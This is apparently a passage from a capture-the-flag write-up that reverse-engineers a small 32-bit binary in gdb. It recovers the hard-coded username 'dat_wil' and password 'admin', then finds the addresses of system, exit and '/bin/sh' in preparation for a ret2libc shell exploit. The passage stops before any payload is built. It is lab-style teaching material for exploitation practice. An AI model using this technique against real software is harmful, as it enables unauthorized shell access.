```as
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name
0x080484a3  verify_user_pass
0x080484d0  main
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```

```as
(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	push   %edi
   0x08048468 <+4>:	push   %esi
   0x08048469 <+5>:	sub    $0x10,%esp
   0x0804846c <+8>:	movl   $0x8048690,(%esp)
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    $0x804a040,%edx
   0x0804847d <+25>:	mov    $0x80486a8,%eax
   0x08048482 <+30>:	mov    $0x7,%ecx
   0x08048487 <+35>:	mov    %edx,%esi
   0x08048489 <+37>:	mov    %eax,%edi
   0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:	seta   %dl
   0x08048490 <+44>:	setb   %al
   0x08048493 <+47>:	mov    %edx,%ecx
   0x08048495 <+49>:	sub    %al,%cl
   0x08048497 <+51>:	mov    %ecx,%eax
   0x08048499 <+53>:	movsbl %al,%eax
   0x0804849c <+56>:	add    $0x10,%esp
   0x0804849f <+59>:	pop    %esi
   0x080484a0 <+60>:	pop    %edi
   0x080484a1 <+61>:	pop    %ebp
   0x080484a2 <+62>:	ret    
End of assembler dump.
```

```as
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```

We will do the same for `verify_user_pass`:

```as
(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:	push   %ebp
   0x080484a4 <+1>:	mov    %esp,%ebp
   0x080484a6 <+3>:	push   %edi
   0x080484a7 <+4>:	push   %esi
   0x080484a8 <+5>:	mov    0x8(%ebp),%eax
   0x080484ab <+8>:	mov    %eax,%edx
   0x080484ad <+10>:	mov    $0x80486b0,%eax
   0x080484b2 <+15>:	mov    $0x5,%ecx
   0x080484b7 <+20>:	mov    %edx,%esi
   0x080484b9 <+22>:	mov    %eax,%edi
   0x080484bb <+24>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080484bd <+26>:	seta   %dl
   0x080484c0 <+29>:	setb   %al
   0x080484c3 <+32>:	mov    %edx,%ecx
   0x080484c5 <+34>:	sub    %al,%cl
   0x080484c7 <+36>:	mov    %ecx,%eax
   0x080484c9 <+38>:	movsbl %al,%eax
   0x080484cc <+41>:	pop    %esi
   0x080484cd <+42>:	pop    %edi
   0x080484ce <+43>:	pop    %ebp
   0x080484cf <+44>:	ret    
End of assembler dump.
```

```as
x/s 0x80486b0
0x80486b0:	 "admin"
```

We will try to get the address of these different calls:

- System
- exit
- bin/sh

```as
(gdb) print &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>

(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec

(gdb) print &exit
$2 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
```